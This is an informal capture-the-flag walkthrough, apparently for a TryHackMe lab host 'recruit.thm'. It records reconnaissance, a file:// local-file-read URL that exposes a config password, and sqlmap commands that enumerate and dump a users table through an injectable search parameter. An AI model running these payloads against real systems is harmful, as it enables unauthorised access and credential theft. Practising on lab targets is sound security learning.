```
Used:
nmap
gobuster
```

found `http://recruit.thm/mail/mail.log`
there was username (hr)

tried to hydra http-post-form lol

it said it only includes local files but this worked
`http://10.114.158.102/file.php?cv=file://config.php`
there was hr password

after logging in
we have a candidate search bar
is it vulnerable to SQL injection?
input: '
answer: yep

Okay I have to admit I got lost trying all sorts of sqli
I was interested in seeing what others did
they used sqlmap...

```
Capture request in Burp -> save to file -> sqlmap -r <request_file> -p <parameter> --dbs
then it's just more sqlmap
1) --tables
1.5) --columns
2) --dump_all
```

so...
burpsuite - intercept **on**
browser proxy - **on**
send request
send from proxy tab to intruder
right-click the request -> save item (saved it as burp.txt)

`sqlmap -r burp.txt -p search --dbs`

`sqlmap -r burp.txt -p search -D recruit_db --tables`

`sqlmap -r burp.txt -p search -D recruit_db -T users --dump-all`

GG!